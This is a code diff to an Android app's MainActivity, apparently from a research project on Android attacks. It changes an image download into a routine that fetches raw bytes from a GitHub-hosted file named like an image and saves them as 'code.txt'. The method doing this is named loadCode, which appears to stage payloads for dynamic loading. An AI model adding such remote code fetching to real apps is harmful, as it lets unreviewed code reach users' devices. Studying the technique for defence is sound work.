@@ -27,6 +27,7 @@ import java.io.InputStream;
 import java.lang.reflect.Field;
 import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
+import java.nio.charset.StandardCharsets;
 import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.Map;
@@ -81,7 +82,7 @@ public class MainActivity extends AppCompatActivity {
 
     private void loadCode() {
         Log.i(TAG, "Downloading file...");
-        String URL = "https://github.com/manwelbugeja/android-attacks/raw/main/resources/cat.jpeg";
+        String URL = "https://github.com/manwelbugeja/android-attacks/raw/main/resources/test.jpg";
         new DownloadFile().execute(URL);
     }
 
@@ -127,7 +128,7 @@ public class MainActivity extends AppCompatActivity {
 
 
     // Class which downloads a file to internal storage of app
-    private class DownloadFile extends AsyncTask<String, Void, Bitmap> {
+    private class DownloadFile extends AsyncTask<String, Void, byte[]> {
 
         @Override
         protected void onPreExecute() {
@@ -135,26 +136,32 @@ public class MainActivity extends AppCompatActivity {
         }
 
         @Override
-        protected Bitmap doInBackground(String... URL) {
+        protected byte[] doInBackground(String... URL) {
             Log.i(TAG, "executing doInBackground...");
-            String imageURL = URL[0];
+            ByteArrayOutputStream buffer = new ByteArrayOutputStream();
 
-            Bitmap bitmap = null;
             try {
-                // Download Image from URL
-                InputStream input = new java.net.URL(URL[0]).openStream();
-                // Decode Bitmap
-                bitmap = BitmapFactory.decodeStream(input);
+                // Download file from URL
+                InputStream is = new java.net.URL(URL[0]).openStream();
+
+                int nRead;
+                byte[] data = new byte[16384];
+
+                while ((nRead = is.read(data, 0, data.length)) != -1) {
+                    buffer.write(data, 0, nRead);
+                }
+
+                return buffer.toByteArray();
+
             } catch (Exception e) {
                 Log.i(TAG, "Exception found");
                 e.printStackTrace();
             }
-            return bitmap;
+            return buffer.toByteArray();
         }
 
-        @SuppressLint("WrongThread")
         @Override
-        protected void onPostExecute(Bitmap result) {
+        protected void onPostExecute(byte[] result) {
             Log.i(TAG, "In Async task");
 
             if (result != null) {
@@ -164,16 +171,12 @@ public class MainActivity extends AppCompatActivity {
                     Log.i(TAG, "Creating directory...");
                     dir.mkdir();
                 }
-                File destination = new File(dir, "image.jpg");
+                File destination = new File(dir, "code.txt");
 
                 try {
                     destination.createNewFile();
-                    ByteArrayOutputStream bos = new ByteArrayOutputStream();
-                    result.compress(Bitmap.CompressFormat.PNG, 0 /*ignored for PNG*/, bos);
-                    byte[] bitmapdata = bos.toByteArray();
-
                     FileOutputStream fos = new FileOutputStream(destination);
-                    fos.write(bitmapdata);
+                    fos.write(result);
                     fos.flush();
                     fos.close();
                 } catch (IOException e) {
